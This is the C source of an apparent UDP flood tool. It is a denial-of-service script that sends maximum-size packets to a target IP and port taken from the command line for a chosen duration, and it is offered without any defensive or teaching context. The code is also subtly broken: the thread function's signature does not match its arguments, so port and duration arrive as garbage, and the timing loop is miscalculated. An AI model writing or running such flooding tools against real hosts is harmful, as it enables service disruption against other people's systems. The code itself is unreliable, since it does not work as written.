#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>

#define BUFFER_SIZE 65507

void udp_flood(const char *ip, int port, int duration) {
    int sock;
    struct sockaddr_in target;
    char buffer[BUFFER_SIZE];
    socklen_t target_len = sizeof(target);

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        exit(EXIT_FAILURE);
    }

    memset(buffer, 'A', BUFFER_SIZE);

    int time_elapsed = 0;
    while (time_elapsed < duration) {
        if (sendto(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&target, target_len) < 0) {
            perror("Sendto failed");
            exit(EXIT_FAILURE);
        }
        time_elapsed = (int)time(NULL) - time_elapsed;
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    pthread_t thread;
    if (pthread_create(&thread, NULL, (void *(*)(void *))udp_flood, (void *)ip) < 0) {
        perror("Could not create thread");
        exit(EXIT_FAILURE);
    }

    pthread_join(thread, NULL);

    return 0;
}
